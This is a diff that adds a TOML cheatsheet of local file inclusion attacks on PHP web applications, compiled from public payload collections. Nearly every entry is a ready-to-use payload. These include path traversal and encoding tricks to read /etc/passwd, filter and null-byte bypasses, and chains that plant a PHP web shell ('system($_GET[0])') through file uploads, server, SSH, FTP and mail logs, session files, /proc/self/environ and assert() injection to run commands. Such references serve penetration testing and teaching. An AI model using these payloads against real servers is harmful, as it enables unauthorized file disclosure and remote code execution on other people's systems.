@@ -1,0 +1,141 @@
+title = "LFI cheatsheet"
+description = "Common ways to exploit local file inclusion vulnerabilities"
+tags = ["web", "LFI", "RCE"]
+source = ["https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md","https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/file-inclusion/lfi2rce-via-php-filters.md"]
+
+[[data]]
+description = "Reading files"
+command = """example.com/view.php?file=/etc/passwd
+example.com/view.php?file=../../../../../etc/passwd"""
+
+[[data]]
+description = "URL encoding and double encoding (../../../etc/passwd)"
+command = """example.com/view.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+example.com/view.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"""
+
+[[data]]
+description = "UTF-8 encoding"
+command = """example.com/view.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+example.com/view.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"""
+
+[[data]]
+description = "Filename truncation. On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away."
+command = """example.com/view.php?file=../../../etc/passwd............[ADD MORE]
+example.com/view.php?file=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+example.com/view.php?file=../../../etc/passwd/./././././.[ADD MORE] 
+example.com/view.php?file=../../../[ADD MORE]../../../../etc/passwd"""
+
+[[data]]
+description = "Filter bypass"
+command = """example.com/view.php?file=....//....//etc/passwd
+example.com/view.php?file=..///////..////..//////etc/passwd
+example.com/view.php?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"""
+
+[[data]]
+description = "Bypass with null byte php < 5.3"
+command = """example.com/view.php?file=../../../../etc/passwd%00"""
+
+[[data]]
+description = "LFI to RCE via /proc/self/environ"
+command = """Send the payload in the User-Agent. You can mix this with the above methods to bypass filters.
+
+GET view.php?file=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>"""
+
+[[data]]
+description = "If you can upload a file, just inject the shell payload in it and include it"
+command = """echo '<?php system($_GET[0]); ?>' >> image.png
+example.com/view.php?file=path/to/uploaded/file/image.png&0=whoami"""
+
+[[data]]
+description = "LFI to RCE via controlled web server log files"
+command = """Make your payload appear in the webserver log file by making a request with it in the url or User-Agent:
+curl example.com/<?php system($_GET[0]);?>
+curl example.com/ -A '<?php system($_GET[0]);?>'
+
+Now include the correspondent log file. Your payload will be triggered:
+example.com/view.php?file=/var/log/apache/access.log&0=whoami
+example.com/view.php?file=/var/log/apache/error.log&0=whoami
+example.com/view.php?file=/var/log/apache2/access.log&0=whoami
+example.com/view.php?file=/var/log/apache2/error.log&0=whoami
+example.com/view.php?file=/var/log/nginx/access.log&0=whoami
+example.com/view.php?file=/var/log/nginx/error.log&0=whoami
+example.com/view.php?file=/var/log/httpd/error_log&0=whoami
+example.com/view.php?file=/usr/local/apache/log/error_log&0=whoami
+example.com/view.php?file=/usr/local/apache2/log/error_log&0=whoami"""
+
+[[data]]
+description = "LFI to RCE via other services log files"
+command = """Make your payload appear in the service log file by trying to authenticate to it with the payload as user:
+$ ssh <?php system($_GET[0]);?>@example.com
+$ curl ftp://<?php system($_GET[0]);?>:secret@example.com/
+
+Now include the correspondent log file. Your payload will be triggered:
+
+example.com/view.php?file=/var/log/vsftpd.log&0=whoami
+example.com/view.php?file=/var/log/sshd.log&0=whoami
+"""
+
+[[data]]
+description = "LFI to RCE via mail"
+command = """Send an email using the open SMTP, then include the log file located at /var/log/mail.
+
+root@kali:~# telnet 10.10.10.10. 25
+Trying 10.10.10.10....
+Connected to 10.10.10.10..
+Escape character is '^]'.
+220 straylight ESMTP Postfix (Debian/GNU)
+helo ok
+250 straylight
+mail from: mail@example.com
+250 2.1.0 Ok
+rcpt to: root
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject: <?php echo system($_GET[0]); ?>
+data2
+.
+
+root@kali:~# curl 10.10.10.10:80/view.php?file=/var/log/mail&0=whoami"""
+
+[[data]]
+description = "LFI to RCE via PHP session"
+command = """Check if the website use PHP Session. (Is the cookie PHPSESSID set?)
+
+Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+
+If so, set the cookie to <?php system($_GET[0]);?> by setting this as user (or other field)
+
+login=1&user=<?php system($_GET[0]);?>&pass=password
+
+This will generate a PHPSESSID cookie. Copy it's value and use LFI to include the PHP session file:
+
+example.com/view.php?file=../../../tmp/sess_i56kgbsq9rm8ndg3qbarhsbm27&0=whoami
+example.com/view.php?file=../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27&0=whoami"""
+
+[[data]]
+description = "Bypass non-recursively stripped path traversal sequence defense"
+command = """example.com/view.php?file=....//....//....//etc/passwd
+example.com/view.php?file=....\/....\/....\/etc/passwd
+example.com/view.php?file=/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"""
+
+[[data]]
+description = "LFI via PHP 'assert()' function"
+command = """If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.
+
+The application may be using assert like this:
+
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+
+Bypass it with the payloads:
+' and die(show_source('/etc/passwd')) or '
+' and die(system("whoami")) or '
+
+example.com/view.php?file=' and die(system("whoami")) or '
+
+(URL encode the payloads before sending them)"""
+
+
+
